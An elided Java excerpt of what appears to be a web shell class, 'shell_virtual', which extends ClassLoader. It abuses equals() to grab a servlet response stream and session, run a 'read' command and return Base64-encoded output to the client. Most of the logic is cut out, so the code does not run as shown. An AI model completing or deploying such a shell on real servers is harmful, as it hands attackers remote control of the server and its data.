...
public class shell_virtual extends ClassLoader
{
    ...
    public boolean equals(Object objParam)
    {
        ...
        try
        {
            ...
            objResponse = fnGetResponse.invoke(objResponse, (Object)new Class[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, (Object)new Class[0]);
            ...
            Object objSession = fnGetSession.invoke(objPageContext, (Object)new Class[0]);
            ...
            else if (szType.equalsIgnoreCase("read"))
            {
                ...
                {
                    byte[] currentBytes = outputBuffer.toByteArray();
                    outputBuffer.reset();

                    String b64Output = Base64.getEncoder().encodeToString(currentBytes);
            ...
            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes(StandardCharsets.UTF_8));
        }
        catch (Exception ex)
        {
            if (osClient != null)
